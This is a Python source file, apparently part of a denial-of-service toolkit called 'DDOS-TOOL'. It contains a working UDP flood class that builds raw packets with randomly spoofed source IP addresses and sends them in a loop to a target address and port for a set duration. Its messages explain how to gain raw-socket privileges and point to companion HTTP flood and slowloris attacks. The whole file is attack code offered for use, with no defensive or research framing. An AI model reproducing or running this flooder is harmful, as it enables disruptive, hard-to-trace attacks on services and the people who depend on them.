"""
DDOS-TOOL

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import os
import random
import socket
import struct
import sys
import time


IS_WINDOWS = sys.platform.startswith("win")


class UDPFlood:
    def __init__(self, cfg: dict, logger):
        self.cfg = cfg
        self.logger = logger

    @staticmethod
    def _rand_ip() -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def run(self, dst_ip: str, dst_port: int, duration_sec: int, payload_size: int = 1024) -> dict:
        if IS_WINDOWS:
            self.logger.error(
                "udp_flood with spoofed source is not supported on Windows. "
                "The OS blocks spoofed source addresses. Use http_flood or "
                "slowloris instead."
            )
            return {"sent": 0, "error": "unsupported_platform"}

        if os.geteuid() != 0:
            self.logger.error(
                "udp_flood requires root on Linux/macOS. Re-run with sudo, or grant "
                "CAP_NET_RAW to the Python binary via: "
                "sudo setcap cap_net_raw+ep $(readlink -f $(which python3))"
            )
            return {"sent": 0, "error": "permission"}

        sent = 0
        deadline = time.time() + duration_sec

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            self.logger.error("udp_flood: raw socket creation denied by kernel.")
            return {"sent": 0, "error": "permission"}
        except OSError as e:
            self.logger.error(f"udp_flood: socket error: {e}")
            return {"sent": 0, "error": "socket"}

        while time.time() < deadline:
            payload = os.urandom(payload_size)
            src_ip = self._rand_ip()
            src_port = random.randint(1024, 65535)

            ip_ihl_ver = (4 << 4) + 5
            ip_tos = 0
            ip_tot_len = 20 + 8 + len(payload)
            ip_id = random.randint(0, 65535)
            ip_frag_off = 0
            ip_ttl = 64
            ip_proto = socket.IPPROTO_UDP
            ip_check = 0
            ip_saddr = socket.inet_aton(src_ip)
            ip_daddr = socket.inet_aton(dst_ip)

            ip_header = struct.pack(
                "!BBHHHBBH4s4s",
                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr,
            )

            udp_len = 8 + len(payload)
            udp_header = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)

            try:
                s.sendto(ip_header + udp_header + payload, (dst_ip, 0))
                sent += 1
            except Exception:
                pass

        s.close()
        return {"sent": sent}
